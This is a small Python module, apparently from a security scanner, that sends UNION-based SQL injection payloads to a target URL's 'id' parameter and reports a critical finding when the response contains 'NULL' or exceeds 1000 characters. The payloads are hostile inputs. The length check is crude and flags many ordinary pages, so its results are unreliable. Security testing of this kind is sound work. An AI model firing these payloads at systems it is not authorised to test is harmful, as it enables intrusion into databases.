"""
Union-Based SQL Injection Tester Module
Tests for SQL injection using UNION-based techniques
"""
from typing import Dict, List
import requests

class UnionBasedTester:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.vulnerabilities = []
        self.payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL--"
        ]
    
    def test_all(self) -> List[Dict]:
        """Run all union-based SQL injection tests"""
        for payload in self.payloads:
            result = self._test_payload(payload)
            if result:
                self.vulnerabilities.append(result)
        return self.vulnerabilities
    
    def _test_payload(self, payload: str) -> Dict:
        """Test single UNION payload"""
        try:
            response = requests.get(f"{self.target_url}?id={payload}", timeout=5)
            if self._check_union_success(response.text):
                return {
                    'type': 'Union-Based SQL Injection',
                    'severity': 'CRITICAL',
                    'payload': payload,
                    'evidence': 'UNION query successful'
                }
        except:
            pass
        return None
    
    def _check_union_success(self, response: str) -> bool:
        """Check if UNION query was successful"""
        return 'NULL' in response or len(response) > 1000
